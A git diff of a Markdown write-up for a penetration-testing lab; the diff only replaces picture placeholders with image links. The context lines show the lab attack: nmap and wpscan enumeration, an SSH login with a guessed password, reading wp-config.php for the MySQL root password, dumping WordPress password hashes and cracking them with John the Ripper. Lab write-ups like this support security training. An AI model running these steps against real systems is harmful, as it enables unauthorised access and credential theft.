@@ -11,7 +11,7 @@ Nmap scan results for each machine reveal the below services and OS details:
 nmap -sV 192.168.1  
 ~~~
 
-[picture]
+![red1](https://user-images.githubusercontent.com/32025331/155894956-f1c31fe2-82f8-4a57-a74d-95c5a0dda68f.PNG)
 
 This scan identifies the services below as potential points of entry:  
   
@@ -36,10 +36,10 @@ Tools used: dirb, wpscan
 ~~~
 wpscan –url http://192.168.1.110/wordpress
 ~~~
-[picture]
+![red2](https://user-images.githubusercontent.com/32025331/155894957-b9e4c47b-09d7-43ff-9d0f-d4a3ef808915.PNG)
 
 We then found two login names: Steven and Michael  
-[picture]  
+![red3](https://user-images.githubusercontent.com/32025331/155894958-c2fc6d12-f3ff-47b4-93a7-9a038cbdac2a.PNG)
 By sheer luck, we guessed the password without brute force:  
 ~~~
 - ssh michael@192.168.1.110
@@ -64,7 +64,7 @@ ssh michael@192.168.1.110
 Password: michael
 cd /var/www/html/wordpress
 ~~~
-[picture]
+![red4](https://user-images.githubusercontent.com/32025331/155894959-9c35c8ed-fc7c-4049-8b13-c03f6d785452.PNG)
 ~~~
 nano wp-config.php  
 mysql -u root -pR@v3nSecurity  
@@ -80,10 +80,10 @@ use wordpress;
 show tables;
 select user_login, user_pass from wp_users;
 ~~~
-[picture]
+![red5](https://user-images.githubusercontent.com/32025331/155894960-bc91d0f1-f6ac-4d95-bc81-c3027734bba8.PNG)
 This is where we found the hashed passwords.  
 Exit back out to Kali. From here we can use John the Ripper:  
-[picture]
+![red6](https://user-images.githubusercontent.com/32025331/155894961-05ed83c8-ab77-40f0-b8e0-33995815607d.PNG)
 SSH into the webserver using Steven’s credentials:  
 ~~~
 Ssh steven@192.168.1.110
